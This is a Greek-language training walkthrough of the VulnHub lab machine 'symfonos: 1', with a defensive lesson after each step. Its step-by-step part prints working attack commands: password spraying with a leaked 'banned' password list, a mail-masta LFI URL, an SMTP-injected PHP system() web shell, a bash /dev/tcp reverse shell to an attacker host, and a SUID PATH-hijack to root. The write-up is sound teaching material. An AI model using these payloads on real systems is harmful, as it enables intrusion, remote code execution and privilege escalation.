# Μηχάνημα 12 — symfonos: 1

> **Θέση:** 12 από 13 · **Ζώνη 3 — Εύκολο** (παγκόσμια θέση **062** από 708)
> **Πλήρες αγγλικό walkthrough:** [`labs/3-062-symfonos-1/README.md`](../../labs/3-062-symfonos-1/README.md)

| | |
| --- | --- |
| **Μηχάνημα** | symfonos: 1 |
| **Δημιουργός** | Zayotic |
| **Κυκλοφορία** | 29 Ιουνίου 2019 |
| **Λειτουργικό** | Debian — Samba 4.5.16, Apache 2.4.25, **Postfix στην :25**, WordPress 5.2.2 |
| **VulnHub** | [entry/symfonos-1,322](https://vulnhub.com/entry/symfonos-1,322/) |
| **Εκτιμώμενος χρόνος** | 5–8 ώρες |

---

## Πώς να χρησιμοποιήσετε αυτή την κάρτα

Ίδιο πρότυπο: **Α** (μέθοδος + θεωρία) · **Β** (το μηχάνημα) · **Γ** (κάθε εντολή, λογικά). Η νέα θεωρία εδώ: **password spraying**, γιατί μια λίστα «απαγορευμένων κωδικών» είναι **όπλο**, **LFI → RCE** μέσω ενός αρχείου που μπορείτε να γράψετε, **SMTP log poisoning**, και **PATH hijacking**.

Διαβάστε το **Α** από την αρχή ως το τέλος *πριν* αγγίξετε το VM — κάθε κόλπος που χρησιμοποιεί το **Γ** ορίζεται εκεί πρώτα. Κάθε βήμα διαβάζεται: **γιατί αυτό το βήμα τώρα → οι εντολές → πώς να διαβάσετε την έξοδο → η παγίδα και το αμυντικό της δίδαγμα**. Απαντήστε τις ερωτήσεις πριν το lab στο **Β.3** σε χαρτί πρώτα· είναι ακριβώς η γνώση που απαιτεί αυτό το μηχάνημα.

---

# Μέρος Α — Η μέθοδος (θεωρία)

## Α.1 Password spraying vs brute force

Η **εκτόξευση (spraying)** δοκιμάζει **λίγους** κοινούς κωδικούς σε **πολλούς** λογαριασμούς· το **brute force** δοκιμάζει **πολλούς** κωδικούς σε **έναν** λογαριασμό. Με απλά λόγια: το spraying είναι *ένα κλειδί, πολλές πόρτες*, το brute force είναι *χίλια κλειδιά, μία κλειδαριά*. Το spraying **νικά τα κλειδώματα** (μία-δύο προσπάθειες ανά λογαριασμό δεν φτάνουν ποτέ το όριο) και **περνά απαρατήρητο** στα logs — κάθε λογαριασμός φαίνεται απλώς σαν μία αποτυχημένη σύνδεση. Γι' αυτό και το «3 κωδικοί × 2 ονόματα χρηστών = 6 προσπάθειες» είναι ρεαλιστική επίθεση, όχι παιχνίδι.

## Α.2 Γιατί μια λίστα «απαγορευμένων κωδικών» είναι **όπλο**

Ένα εσωτερικό σημείωμα λέει: *«οι παρακάτω κωδικοί είναι πλέον ΑΠΑΓΟΡΕΥΜΕΝΟΙ: epidioko, qwerty, baseball»*. Ο διαχειριστής δημοσίευσε μια λίστα κωδικών **σε χρήση** — γιατί απαγορεύεις **ό,τι χρησιμοποιείται**. Είναι, λειτουργικά, μια **έτοιμη λίστα κωδικών**. Το σωστό σημείωμα θα **μην** κατέγραφε ποτέ τους κωδικούς, παρά μόνο την **πολιτική** («τουλάχιστον 14 χαρακτήρες, όχι λέξεις λεξικού»).

## Α.3 LFI → RCE: το κρίσιμο «δεύτερο αρχείο»

Ένα LFI διαβάζει αρχεία. Για να γίνει **εκτέλεση κώδικα**, χρειάζεστε **ένα αρχείο που μπορείτε να γράψετε** και που ο LFI μπορεί να συμπεριλάβει, **σε προβλέψιμη διαδρομή**. Εδώ: **το γραμματοκιβώτιο του Postfix** (`/var/mail/helios`), που είναι **εγγράψιμο** από όποιον στέλνει mail. Τα συνήθη primitives: mail spools, web logs (`User-Agent` poisoning), session files, `/proc/self/environ`, NFS exports. Ρωτήστε για κάθε LFI: *ποιο αρχείο σε αυτό το μηχάνημα μπορώ **εγώ** να προκαλέσω να γραφτεί — και ξέρω την ακριβή του διαδρομή;*

## Α.4 SMTP log poisoning

Το Postfix **γράφει το email σας, αυτούσιο, σε ένα αρχείο**. Στείλτε PHP μέσα στο μήνυμα (ή στο `MAIL FROM:`), και αυτή προσγειώνεται στο `/var/mail/helios`. Μετά **συμπεριλάβετε το γραμματοκιβώτιο μέσω του LFI** — η PHP βρίσκει τα `<?php … ?>` και τα **εκτελεί**. **LFI + log poisoning = RCE.**

Το SMTP είναι ένα **γραμμο-προσανατολισμένο πρωτόκολλο κειμένου**: το μιλάτε με το χέρι, μία εντολή ανά γραμμή. Οι κωδικοί απάντησης είναι η γραμματική του: **`220`** χαιρετισμός, **`250`** επιτυχία, **`354`** «ξεκίνα να στέλνεις το σώμα», **`221`** αντίο, και το σώμα τελειώνει με μια γραμμή που περιέχει **μία μόνο τελεία**.

## Α.5 PATH hijacking

Όταν ένα προνομιούχο πρόγραμμα καλεί μια εντολή **χωρίς απόλυτη διαδρομή** (π.χ. `curl` αντί `/usr/bin/curl`), το κέλυφος ψάχνει στο `$PATH` **από αριστερά προς τα δεξιά** και τρέχει το **πρώτο** ταίριασμα. Βάλτε έναν **δικό σας κατάλογο** πρώτο, με ένα εκτελέσιμο **ίδιου ονόματος**, και τρέχει το δικό σας — ως root.

> **Δύο κανόνες που σκοτώνουν όλη την κατηγορία.** **Ποτέ** μην αφήνετε ένα SUID πρόγραμμα να λύνει εντολές μέσω `$PATH` (απόλυτες διαδρομές, `secure_path`, `env -i`). **Ποτέ** μην αφήνετε mail spools, logs ή session files συμπεριλαμβανόμενα από μια web εφαρμογή.

---

# Μέρος Β — Το μηχάνημα

## Β.1 Τι θα μάθετε

1. Να απαριθμείτε ένα **ανώνυμο (null) SMB share** και να διαβάζετε ένα διερχόμενο εσωτερικό σημείωμα.
2. Γιατί μια λίστα «απαγορευμένων κωδικών» είναι **περιουσιακό στοιχείο επίθεσης**, και πώς να κάνετε **spray** με αυτή.
3. Να απαριθμείτε χρήστες SMB μέσω **RID/SID** (`enum4linux`).
4. Να στήνετε το απαιτούμενο **hostname** στο `/etc/hosts` (`symfonos.local`).
5. Να απαριθμείτε **plugins WordPress επιθετικά** και να τα ταιριάζετε με δημόσια exploits.
6. Να επιβεβαιώνετε και να εκμεταλλεύεστε το **LFI** διαβάζοντας το `/etc/passwd`.
7. Να εκτελείτε **SMTP log poisoning** από άκρη σε άκρη.
8. Να διαβάζετε ένα **παγκόσμια αναγνώσιμο, απροστάτευτο γραμματοκιβώτιο Postfix**.
9. Να αναβαθμίζετε μέσω **PATH hijack σε ένα SUID binary που καλεί το `curl` με σκέτο όνομα**.

## Β.2 Ο χάρτης

| Στάδιο | Πού |
| --- | --- |
| Ανώνυμο SMB διαρρέει **πολιτική κωδικών** | `\\target\anonymous` → **`attention.txt`** |
| Η λίστα πολιτικής χρησιμοποιείται ως **λίστα κωδικών** | banned: `epidioko`, **`qwerty`**, `baseball` |
| Χρήστες μέσω SID | `enum4linux -a` → `SYMFONOS\helios` (1000), `SYMFONOS\zeus` (1001) |
| **Spraying** | `smbclient //TARGET/helios -U 'helios%qwerty'` |
| Κρυφή διαδρομή | notes → WordPress στο **`/h3l105`** |
| Ευάλωτα plugins | **`mail-masta 1.0`**, `site-editor 1.1.1` |
| **LFI** | `…/mail-masta/inc/campaign/count_of_send.php?pl=` |
| **SMTP log poisoning → RCE** | PHP στο `helios` → `/var/mail/helios` → include |
| **SUID με σκέτο όνομα** | `/opt/statuscheck` τρέχει `curl -I http://localhost` |

## Β.3 Πριν ξεκινήσετε

- [03 — Επιθέσεις σε Υπηρεσίες](<../03-Επιθέσεις-σε-Υπηρεσίες.md>) **§3** (SMB) και **§4** (SMTP — το payload του log poisoning).
- [02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) **§3.3** (LFI, RCE primitives) και §4 (plugins WordPress).
- [05 — Αναβάθμιση Προνομίων Linux](<../05-Αναβάθμιση-Προνομίων-Linux.md>) **§7** (PATH hijacking) — όλο το τμήμα.

**Απαντήστε πριν:**
1. Ένα σημείωμα λέει «αυτοί οι κωδικοί ΑΠΑΓΟΡΕΥΟΝΤΑΙ». Γιατί είναι δώρο για έναν επιτιθέμενο;
2. Τι είναι το **password spraying**, και σε τι διαφέρει από το brute force;
3. Έχεις LFI που διαβάζει οποιοδήποτε αρχείο. Τι πρέπει να ισχύει για ένα **δεύτερο** αρχείο για να πετύχεις RCE;
4. Πού βάζει το Postfix το mail ενός τοπικού χρήστη, και ποιος μπορεί να γράψει σε αυτό;
5. Το `/opt/statuscheck` τρέχει `curl -I http://localhost`. Ονομάστε την ευπάθεια χωρίς να ψάξετε.

---

# Μέρος Γ — Η διαδρομή, βήμα-βήμα

Σε όλη τη διαδρομή, αντικαταστήστε το `TARGET` με την IP του στόχου (π.χ. `192.168.56.101`).

## Βήμα 1 — Hostname, μετά μια σάρωση δύο σταδίων

**Γιατί τώρα.** Δεν ξέρετε ακόμη καμία θύρα, και αυτό το WordPress ήταν ρυθμισμένο για το `symfonos.local` — χωρίς αυτό το όνομα κάθε μετέπειτα HTTP αίτημα φαίνεται σπασμένο. Το `echo … | sudo tee -a /etc/hosts` προσθέτει στο τέλος (`-a`· ποτέ μην αντικαθιστάτε) του αρχείου hosts που ανήκει στον root· δύο ονόματα, γιατί οι σύνδεσμοι του web χρησιμοποιούν το `symfonos.local` ενώ τα banners του SMTP ανακοινώνουν το `symfonos.localdomain`.

```bash
echo "TARGET symfonos.local symfonos.localdomain" | sudo tee -a /etc/hosts
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports TARGET
sudo nmap -sC -sV -p 22,25,80,139,445 -oA scans/services TARGET
```

```text
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.4 (protocol 2.0)
25/tcp  open  smtp        Postfix smtpd
80/tcp  open  http        Apache httpd 2.4.25 ((Debian))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 4.5.16-Debian
```

**Πώς το διαβάζετε.** **Η θύρα 25 είναι ο σπόρος όλου του μηχανήματος** — το SMTP ανοιχτό δεν είναι από μόνο του ευπάθεια, αλλά σημαίνει ότι το μηχάνημα **δέχεται mail και το γράφει σε αρχείο**, και ένα LFI μπορεί να συμπεριλάβει αυτό το αρχείο (Α.3). Το `-p-` σαρώνει και τις 65 535 θύρες· το `--min-rate 1000` τελειώνει τη σάρωση σε λεπτά· το `-T4` είναι σταθερά-επιθετικό· το `-oA` κρατά αποδεικτικά `.nmap`/`.xml`/`.gnmap`· το δεύτερο πέρασμα σαρώνει μόνο αυτές τις πέντε θύρες, βαθιά: `-sC` default scripts, `-sV` εκδόσεις — η στήλη που τροφοδοτεί αργότερα το `searchsploit`.

**Παγίδα & άμυνα.** Μια άσχημη, «σπασμένη» σελίδα πριν την εγγραφή στο hosts είναι φυσιολογική: το WordPress εκπέμπει απόλυτα URLs `symfonos.local` των οποίων το CSS κάνει 404 (το SBXIO τεκμηριώνει αυτή τη σύγχυση), και το `-T5` είναι χειρότερο από το `-T4` γιατί εγκαταλείπει αργές απαντήσεις και αναφέρει ψευδή αρνητικά. Μία μη πιστοποιημένη σάρωση απέδωσε ήδη κάθε θύρα και έκδοση — κάντε patch, και «γεράστε» τα banners σας.

## Βήμα 2 — SMB: το ανώνυμο share

**Γιατί τώρα.** Το Samba απαντά στις 139/445, και το SMB είναι ο πλουσιότερος **μη πιστοποιημένος** στόχος απαρίθμησης που υπάρχει: shares, σχόλια, χρήστες και πολιτική όλα διαρρέουν πριν καν μία σύνδεση. Το `smbclient` είναι ένας πελάτης σαν FTP· το `-L` **λισταρεί** shares αντί να ανοίξει ένα· το `-N` ζητά **null session** (χωρίς κωδικό)· μέσα, το `dir` λιστούν και το `get <file>` κατεβάζει. (Το `smbmap -H TARGET` είναι η εναλλακτική που τυπώνει στήλη δικαιωμάτων ανά share.)

```bash
smbclient -L //TARGET -N
smbclient //TARGET/anonymous -N
smb: \> dir
smb: \> get attention.txt
```

```text
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
helios          Disk      Helios personal share
anonymous       Disk
IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
```

```text
A word to the wise...
All users are required to change their passwords. The following passwords are now BANNED:
epidioko
qwerty
baseball
```

**Πώς το διαβάζετε.** Πριν διαβάσετε ένα-ένα αρχείο, η **λίστα shares διαρρέει ήδη ένα όνομα χρήστη**: `helios`, σχόλιο *Helios personal share*· τα `print$` και `IPC$` είναι stock Samba — αγνοήστε τα. Μετά το σημείωμα: **διαβάστε το ως πρόσκληση, όχι προειδοποίηση** (Α.2) — ο διαχειριστής δημοσίευσε κωδικούς **σε χρήση**. Τρεις υποψήφιοι, συν ένα πραγματικό όνομα χρήστη από το ίδιο το όνομα του share.

**Παγίδα & άμυνα.** Οι αρχάριοι αρχειοθετούν το σημείωμα κάτω από «αμυντική ειδοποίηση» και προχωρούν· και ένα null session που δείχνει `NO ACCESS` στο `helios` είναι *αναμενόμενο* — μόνο το `anonymous` είναι ανοιχτό, και αρκεί. Δύο λάθος ρυθμίσεις έκαναν τη ζημιά: ένα ανώνυμο share, και πραγματικοί κωδικοί αποθηκευμένοι παγκόσμια αναγνώσιμοι. Απενεργοποιήστε την πρόσβαση guest παντού· διανείμετε **πολιτική** κωδικών, ποτέ **δεδομένα** κωδικών.

## Βήμα 3 — Χρήστες μέσω RID, μετά ο προφανής κωδικός

**Γιατί τώρα.** Κρατάτε μια λίστα 3 κωδικών· το spraying χρειάζεται ονόματα χρηστών. Το `enum4linux -a` τρέχει *όλα* τα τεστ — χρήστες, shares, πολιτική.

```bash
enum4linux -a TARGET
```

```text
S-1-5-21-...-1000 SYMFONOS\helios (Local User)
S-1-5-21-...-1001 SYMFONOS\zeus   (Local User)
```

**Πώς το διαβάζετε.** Η λίστα ήρθε από **RID cycling**: το Samba ταυτοποιεί λογαριασμούς με ένα SID του οποίου ο τελευταίος αριθμός είναι το **RID** (*relative identifier*)· οι χρήστες Unix ξεκινούν από το **1000**, άρα το 1000 είναι ο πρώτος λογαριασμός και το 1001 ο δεύτερος. Αν μια ανώνυμη συνεδρία μπορεί να καλέσει `SamrLookupRids`, απλώς ρωτάτε *«ποιος είναι το RID 1000; 1001;»* — **χωρίς κωδικό, χωρίς exploit, μόνο μια λάθος ρύθμιση δικαιώματος**. Έχετε τώρα τον `helios` (που το υπονοεί και το share) και τον `zeus` (τον συντάκτη του σημειώματος).

```bash
smbclient //TARGET/helios -U 'helios%qwerty'
smb: \> dir
smb: \> get todo.txt
```

```text
1. vi /etc/hosts to add symfonos.local
2. I'm working on a WordPress site at /h3l105
```

**Πώς το διαβάζετε.** Στο `-U 'user%password'` το `%` χωρίζει τα δύο μισά και πρέπει να **βάλετε όλο το όρισμα σε μονά εισαγωγικά** — τα `%` και `!` έχουν νόημα για ένα κέλυφος χωρίς εισαγωγικά. Το `qwerty` δούλεψε κατευθείαν από τη λίστα· έξι προσπάθειες συνολικά (2 χρήστες × 3 κωδικοί) είναι **spraying**, όχι brute force (Α.1). Το `todo.txt` δίνει το `/h3l105` και επιβεβαιώνει το hostname· το `research.txt` είναι διακοσμητικό κείμενο για τον ελληνικό θεό του ήλιου — **rabbit hole**, δεν κρύβει διαπιστευτήρια.

**Παγίδα & άμυνα.** Το διαδραστικό bash επεκτείνει το `!` μέσα σε διπλά εισαγωγικά, γι' αυτό να βάζετε πάντα μονά εισαγωγικά στο `-U`. Αμυντικά, περιορίστε την ανώνυμη/SID απαρίθμηση, απαιτήστε SMB signing, και ελέγξτε τους κωδικούς έναντι λιστών παραβιασμένων κωδικών: ο `helios` χρησιμοποίησε ξανά έναν «απαγορευμένο» κωδικό — ακριβώς αυτό που η απαγόρευση απέτυχε να σταματήσει.

## Βήμα 4 — Απαρίθμηση WordPress

**Γιατί τώρα.** Το `todo.txt` έδωσε μια διαδρομή· αποτυπώστε τι τρέχει εκεί και κυνηγήστε **γνωστά**-ευάλωτα στοιχεία — εδώ το «βρήκα έναν ιστότοπο» γίνεται «βρήκα ένα exploit». Το `--plugins-detection aggressive` αποτυπώνει plugins *ζητώντας τα γνωστά τους αρχεία* αντί να διαβάζει μόνο ό,τι αναφέρει το HTML· το `-e ap,u` απαριθμεί **όλα τα plugins** και **τους χρήστες**· το `searchsploit` ψάχνει το offline αντίγραφο του Exploit-DB και το `-x` **εξετάζει** μια εγγραφή χωρίς να την αντιγράψει — διαβάστε τα exploits πριν τα τρέξετε.

```bash
wpscan --url http://symfonos.local/h3l105 --plugins-detection aggressive -e ap,u
searchsploit wordpress mail masta
searchsploit -x php/webapps/40290.txt
```

```text
[+] mail-masta   | Version: 1.0 (100% confidence)
[+] site-editor  | Version: 1.1.1 (80% confidence)
WordPress Plugin Mail Masta 1.0 - Local File Inclusion | php/webapps/40290.txt
```

**Πώς το διαβάζετε.** Το `(100% confidence)` σημαίνει ότι το wpscan ανέκτησε το ίδιο το `readme.txt` του plugin· το `(80%)` αποτυπώνεται από διαδρομές αρχείων. Ο κανόνας που μετράει: το όνομα **και** η έκδοση του plugin ταιριάζουν και τα δύο με το exploit — η εγγραφή είναι **εφαρμόσιμη**, όχι απλώς παρόμοια. Το wpscan λιστούν επίσης τον `admin`, αλλά οι επιθέσεις λεξικού στο `wp-login.php` είναι τεκμηριωμένο αδιέξοδο εδώ — μην χάσετε ώρες εκεί.

**Παγίδα & άμυνα.** Το SBXIO αναφέρει ότι μια κανονική σάρωση plugins δεν επέστρεψε **τίποτα** και μόνο το `--plugins-detection aggressive --force` ανέδειξε τα plugins — αν το wpscan πει «no plugins», αλλάξτε τη λειτουργία ανίχνευσης πριν συμπεράνετε ότι ο ιστότοπος είναι καθαρός. Αμυντικά, ενημερώστε ή **αφαιρέστε** τα αχρησιμοποίητα plugins (το `mail-masta` ήταν εγκαταλελειμμένο εδώ και καιρό) και ειδοποιήστε για επιθετική ανίχνευση plugins.

## Βήμα 5 — Επιβεβαιώστε το LFI

**Γιατί τώρα.** Έχετε ένα ύποπτο endpoint· αποδείξτε το πριν χτίσετε πάνω του. Το `curl -s` ανακτά το URL με σιωπηλό το μετρητή προόδου· το `?pl=` είναι η ευάλωτη παράμετρος· το `/etc/passwd` είναι το κλασικό αρχείο απόδειξης — παγκόσμια αναγνώσιμο, άρα το include πετυχαίνει, και χωρίς ετικέτες `<?php`, άρα η PHP το εκπέμπει ως literal.

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
```

```text
root:x:0:0:root:/root:/bin/bash
helios:x:1000:1000:helios,,,:/home/helios:/bin/bash
```

**Πώς το διαβάζετε.** Τα πεδία είναι `name:password:UID:GID:comment:home:shell`: ο `root` είναι UID `0`, ο `helios` είναι UID `1000` — επιβεβαιώνοντας ανεξάρτητα το Βήμα 3. Το plugin κάνει `include($_GET['pl']);` — **κανένα φίλτρο, καμία allow-list** — άρα μπορείτε να διαβάσετε οποιοδήποτε αρχείο μπορεί ο web χρήστης, **αλλά όχι ακόμη να τρέξετε κώδικα**· εδώ συναντιούνται τα δύο μισά του μηχανήματος.

**Παγίδα & άμυνα.** Η συμπερίληψη ενός αρχείου **PHP** το *εκτελεί* αντί να το τυπώσει — γι' αυτό το `wp-config.php` δεν διαρρέει τίποτα μέσω αυτού του LFI (SBXIO) αν και ένα shell μπορεί να το διαβάσει· για **πηγαίο** κώδικα PHP τυλίξτε τη διαδρομή στο `php://filter/convert.base64-encode/…` ([02 — Επιθέσεις στο Web](<../02-Επιθέσεις-στο-Web.md>) §3.3). Αν η διαδρομή του plugin κάνει 404 στη δική σας έκδοση, το mail-masta έχει ένα **δεύτερο** endpoint, το `inc/lists/csvexport.php?pl=`. Αμυντικά, ποτέ μην χτίζετε μια διαδρομή `include` από είσοδο χρήστη — χαρτογραφήστε μόνοι σας μια allow-list σταθερών κλειδιών.

## Βήμα 6 — SMTP log poisoning: LFI → RCE

**Γιατί τώρα.** Το LFI μόνο *διαβάζει*· η θύρα 25 σας αφήνει να **γράψετε**, και το Postfix αποθηκεύει το παραδοθέν mail σε προβλέψιμη διαδρομή — το «δεύτερο αρχείο» του Α.3. Διαβάστε πρώτα το γραμματοκιβώτιο ως έχει (`…?pl=/var/mail/helios`) για να επιβεβαιώσετε τη διαδρομή· μερικά writeups το βρίσκουν επίσης στο `/var/spool/mail/helios` (SBXIO). Μετά μιλήστε SMTP με το χέρι (Α.4) — πληκτρολογείτε τις γραμμές του πελάτη, οι απαντήσεις του server φτάνουν αναμεμειγμένες:

```text
nc TARGET 25
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)   ← server greets first (220)
EHLO attacker                                          → 250 accepted
MAIL FROM: attacker@kali                               → 250 accepted
RCPT TO: helios                                        → 250 accepted
DATA                                                   → 354 send your body now
<?php system($_GET['c']); ?>                           ← the poison
.                                                      ← single dot ends the body
QUIT                                                   → 250 queued, then 221 bye
```

**Πώς το διαβάζετε.** Οι κωδικοί απάντησης είναι η γραμματική: `220` χαιρετισμός, `250` επιτυχία, `354` «σώμα τώρα», `221` αντίο — και η μοναχική `.` είναι ο **δείκτης τέλους δεδομένων, όχι μέρος του μηνύματος**. Το `250 2.0.0 Ok: queued` είναι η απόδειξη: το Postfix θα το γράψει στο `/var/mail/helios`. Τώρα πυροδοτήστε το:

```bash
nc -lvnp 4444                                            # Kali, first
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=id"
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Πώς το διαβάζετε.** **LFI + log poisoning = RCE**: το include τραβά το γραμματοκιβώτιο, η PHP βρίσκει τα `<?php … ?>` που στείλαμε με mail και τα εκτελεί, το `&c=` παρέχει την εντολή για το `system()`. Το `uid=33` είναι ο `www-data`, ο λογαριασμός web του Debian (UID 33 που ανατίθεται στην εγκατάσταση).

**Παγίδα & άμυνα.** Οι σχολιαστές του Hacking Articles αναφέρουν mail που «μπαίνει στην ουρά αλλά τίποτα δεν συμβαίνει» — συνήθεις αιτίες: καμία γραμμή με μία τελεία, ένα `RCPT TO` που δεν είναι τοπικός χρήστης, ή ένα payload που δεν έφτασε ποτέ στο σώμα· το SBXIO επιβεβαιώνει τον παραλήπτη με `VRFY helios` και χρειάστηκε `sendEmail … -o tls=no` επειδή το Postfix διαφημίζει STARTTLS (το χειροκίνητο `nc` το αποφεύγει), ενώ ο crazyeights225 ενέχει την PHP στο `MAIL FROM:`. Αμυντικά, δέστε το Postfix στο localhost, κρατήστε το `/var/mail/*` μη-συμπεριλαμβανόμενο, ειδοποιήστε για `<?php` στο SMTP.

## Βήμα 7 — Reverse shell και αναβάθμιση TTY

**Γιατί τώρα.** Το `&c=id` είναι μία εντολή τη φορά πάνω από HTTP· ένα shell είναι διαδραστική συνεδρία — και **reverse** shell, γιατί οι εισερχόμενες συνδέσεις στον στόχο σας συνήθως φιλτράρονται ενώ οι εξερχόμενες όχι. Ξεκινήστε τον listener **πρώτα**· `-l` listen, `-v` verbose, `-n` χωρίς DNS, `-p` θύρα (χρησιμοποιήστε μία πάνω από 1024 για να μην χρειάζεστε root):

```bash
nc -lvnp 4444
```

```bash
curl -s "http://symfonos.local/h3l105/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/mail/helios&c=$(python3 -c "import urllib.parse as u;print(u.quote('bash -i >& /dev/tcp/ATTACKER/4444 0>&1'))")"
```

**Πώς το διαβάζετε.** **Το URL-encoding είναι υποχρεωτικό** — το `&` χωρίζει παραμέτρους και το `>` είναι δεσμευμένο, άρα ένα μη κωδικοποιημένο payload αλλοιώνεται πριν το δει η PHP· το `urllib.parse.quote` το διορθώνει. Στο payload, το `>&` στέλνει stdout **και** stderr στο socket και το `0>&1` στέλνει εκεί και το stdin — αυτό το ζεύγος κάνει το shell *διαδραστικό*. Εναλλακτικές που επιβεβαιώνονται σε writeups: `nc -e /bin/sh` (crazyeights225, Hacking Articles) και `bash -c 'bash -i >& /dev/tcp/…'` (rudefish, SBXIO). Αναβαθμίστε το TTY αμέσως, αλλιώς το `Ctrl+C` σκοτώνει τον *listener* σας και τα `sudo`/`vim` αρνούνται να τρέξουν:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'   # target
# Ctrl+Z (suspends the job on Kali), then on Kali:  stty raw -echo; fg
export TERM=xterm                                  # target
```

**Παγίδα & άμυνα.** Η πυροδότηση πριν σηκωθεί ο listener δίνει άρνηση σύνδεσης και καίει την προσπάθεια· το `/dev/tcp` είναι χαρακτηριστικό της **bash** — αν πεθάνει σιωπηλά, δοκιμάστε την παραλλαγή `nc`/`python`. Αμυντικά, το φιλτράρισμα εξόδου και οι ειδοποιήσεις για εξερχόμενα shells από τον `www-data` σταματούν αυτό το βήμα ευθέως.

## Βήμα 8 — Το κυνήγι SUID βρίσκει ένα custom binary

**Γιατί τώρα.** Είστε χαμηλών προνομίων· η αναβάθμιση ξεκινά με την πιο φθηνή ερώτηση — *τι μπορώ ήδη να τρέξω με τα προνόμια κάποιου άλλου;* Το `find / -perm -u=s -type f` βρίσκει **κανονικά αρχεία με το SUID bit** (το `2>/dev/null` πετά τις χιλιάδες γραμμές `Permission denied` που θα έθαβαν την απάντηση)· το `strings` εξάγει εκτυπώσιμο ASCII από ένα μεταγλωττισμένο binary, ώστε να διαβάσετε το κρυμμένο κείμενό του χωρίς απομεταγλώττιση.

```bash
find / -perm -u=s -type f 2>/dev/null
ls -l /opt/statuscheck
strings /opt/statuscheck | grep -iE 'curl|/bin|/usr'
```

```text
/opt/statuscheck
-rwsr-xr-x 1 root root 8632 Jun 29  2019 /opt/statuscheck
curl -I http://localhost
```

**Πώς το διαβάζετε.** Όλα τα υπόλοιπα (`passwd`, `su`, `mount`, `ping`, `ssh-keysign`, …) είναι **stock Debian** — συγκρίνετε με αυτή τη βάση και η παράξενη εγγραφή ξεχωρίζει: ένα custom πρόγραμμα στο `/opt`. Στο `-rwsr-xr-x` το **`s` κάθεται εκεί όπου θα ήταν το bit εκτέλεσης του ιδιοκτήτη** και ο ιδιοκτήτης είναι `root`, άρα τρέχει ως root για όλους. Η γραμμή-κλειδί είναι `curl -I http://localhost`: το **`curl` χωρίς αρχικό `/`** είναι η ευπάθεια, και το `strings` δείχνει επίσης ότι το binary εισάγει το `system()` (crazyeights225).

**Παγίδα & άμυνα.** Το `/opt/statuscheck` **δεν** είναι στο GTFOBins (SBXIO) επειδή είναι custom — καμία έτοιμη συνταγή, πρέπει να το διαβάσετε μόνοι σας — και μην παραλείπετε ποτέ το `sudo -l`. Αμυντικά: απόλυτες διαδρομές στα προνομιούχα προγράμματα, και αφαιρέστε το SUID από ό,τι δεν το χρειάζεται.

## Βήμα 9 — Το PATH hijack

**Γιατί τώρα.** Το `statuscheck` τρέχει ως root και λύνει το `curl` μέσω `$PATH`· εσείς ελέγχετε το `$PATH` για τη διεργασία που ξεκινάτε, άρα ελέγχετε τι εκτελεί ο root.

```bash
cd /tmp
printf '/bin/sh -p\n' > curl
chmod +x curl
export PATH=/tmp:$PATH
/opt/statuscheck
id
cat /root/proof.txt
```

```text
uid=0(root) gid=0(root) groups=0(root)
```

**Πώς το διαβάζετε.** `cd /tmp` — ένας παγκόσμια εγγράψιμος κατάλογος πάντα ανοιχτός σε σας. Το `printf … > curl` γράφει ένα script με όνομα **ακριβώς όπως η εντολή που καλεί το binary** (το `printf`, όχι το `echo`, εκπέμπει αξιόπιστα την τελική νέα γραμμή)· το `chmod +x` το κάνει εκτελέσιμο — χωρίς αυτό ο root παίρνει «Permission denied» και συμπεραίνετε λανθασμένα ότι το hijack είναι αδύνατο· το `export PATH=/tmp:$PATH` **βάζει το `/tmp` στην αρχή** ώστε το *δικό σας* `curl` να βρεθεί πρώτο (το να το προσθέτατε στο τέλος θα άφηνε το `/usr/bin/curl` μπροστά — και θα μην έκανε τίποτα σιωπηλά). Το prompt γίνεται `#` και το `id` τυπώνει **`uid=0(root)`**· το `cat /root/proof.txt` είναι το flag.

**Παγίδα & άμυνα.** Οι τρεις κλασικές αποτυχίες, με σειρά: PATH στο τέλος αντί στην αρχή, έλλειψη `chmod +x`, και λησμονιά του `-p` — χωρίς αυτό το `sh` ρίχνει το κληρονομημένο πραγματικό UID ως μέτρο ασφαλείας, παίρνετε `$` αντί για root, και υποθέτετε ότι η επίθεση απέτυχε. Επαναφέρετε μετά: `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin`, διαγράψτε το `/tmp/curl`. Άλλα payloads που δουλεύουν: ένα αντίγραφο του bash με SUID (`cp /bin/bash /tmp/rootbash && chmod u+s …`), ή ένα μεταγλωττισμένο πρόγραμμα C με `setuid(0)` — το gcc υπάρχει στο μηχάνημα (rudefish, SBXIO)· μερικά writeups παίρνουν `euid=0` από ένα σκέτο `/bin/sh` (crazyeights225), άρα το `-p` είναι η παραλλαγή που δεν εξαρτάται ποτέ από το κέλυφος.

---

# Μέρος Δ — Αμυντικά μαθήματα

| Εύρημα | Διόρθωση |
| --- | --- |
| **Ανώνυμο SMB share** | Απενεργοποίηση guest/anonymous σε κάθε share· τριμηνιαίος έλεγχος shares |
| Σημείωμα με απαγορευμένους κωδικούς | Μια λίστα απαγόρευσης είναι **λίστα υποδείξεων**. Διανομή πολιτικής μόνο μέσω πιστοποιημένων καναλιών |
| `helios : qwerty` | Επιβολή πολυπλοκότητας/μήκους· έλεγχος έναντι λίστας παραβιασμένων κωδικών· lockout και rate limiting |
| Χρήστες SMB απαριθμήσιμοι μέσω SID | Υποχρεωτικό SMB signing· περιορισμός ανώνυμης απαρίθμησης |
| **`mail-masta 1.0` / `site-editor 1.1.1` LFI** | Ενημέρωση ή **αφαίρεση** αχρησιμοποίητων plugins· block στα plugin paths στο WAF ως προσωρινό μέτρο |
| `pl=` που φτάνει στο `include()` | Ποτέ include path από είσοδο χρήστη — χρήση allow-list σταθερών κλειδιών |
